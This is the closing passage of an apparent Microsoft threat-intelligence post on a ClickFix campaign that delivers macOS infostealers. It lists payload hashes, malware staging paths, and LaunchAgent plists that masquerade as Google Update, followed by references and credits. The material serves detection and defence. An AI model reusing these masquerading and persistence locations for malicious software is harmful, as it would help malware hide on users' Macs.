IndicatorTypeDescription&nbsp;9d2da07aa6e7db3fbc36b36f0cfd74f78d5815f5ba55d0f0405cdd668bd13767&nbsp;&nbsp;SHA-256Payload&nbsp;&nbsp;7ca42f1f23dbdc9427c9f135815bb74708a7494ea78df1fbc0fc348ba2a161aeSHA-256Payload241a50befcf5c1aa6dab79664e2ba9cb373cc351cb9de9c3699fd2ecb2afab05&nbsp;&nbsp;SHA-256Payload522fdfaff44797b9180f36c654f77baf5cdeaab861bbf372ccfc1a5bd920d62eSHA-256Payload



File indicators of attack



IndicatorTypeDescription/tmp/helperFolder pathMalware staging &nbsp;/tmp/starterFolder pathMalware plist staging~/Library/Application Support/Google/GoogleUpdate.app/Contents/MacOS/GoogleUpdateFolder pathMalicious file masquerading as Google Update component~/LaunchAgents/com.google.keystone.agent.plistPlist name&nbsp;Staged plist running malicious executable~/Library/LaunchAgents/com.&lt;random value&gt;.plistPlist nameStaged plist running malicious executable&nbsp;



References




Fake CleanMyMac site installs SHub Stealer and backdoors crypto wallets. Malwarebytes labs (published 2026-03-06)



Malvertising Campaign Spreads AMOS ‘malext’ macOS Infostealer via Fake Text-Sharing Ads. gbhackers (published 2026-03-03)



ClickFix Is Targeting Mac Users Through Google Ads and Fake AI Guides. IzooLogic(published 2026-02-18)



Phantom in the vault: Obsidian abused to deliver PhantomPulse RAT. elastic security (published 2026-04-13)



https://www.iru.com/blog/atomic-stealer-amos-returns (published 2026-03-31)




This research is provided by Microsoft Defender Security Research with contributions from Arlette Umuhire Sangwa, Kajhon Soyini, Srinivasan Govindarajan, Michael Melone, and  members of Microsoft Threat Intelligence.



Learn more




For the latest security research from the Microsoft Threat Intelligence community, check out the Microsoft Threat Intelligence Blog.



To get notified about new publications and to join discussions on social media, follow us on LinkedIn, X (formerly Twitter), and Bluesky.



To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the Microsoft Threat Intelligence podcast.

The post ClickFix campaign uses fake macOS utilities lures to deliver infostealers appeared first on Microsoft Security Blog.

---
*원문: [https://www.microsoft.com/en-us/security/blog/2026/05/06/clickfix-campaign-uses-fake-macos-utilities-lures-deliver-infostealers/](https://www.microsoft.com/en-us/security/blog/2026/05/06/clickfix-campaign-uses-fake-macos-utilities-lures-deliver-infostealers/)*
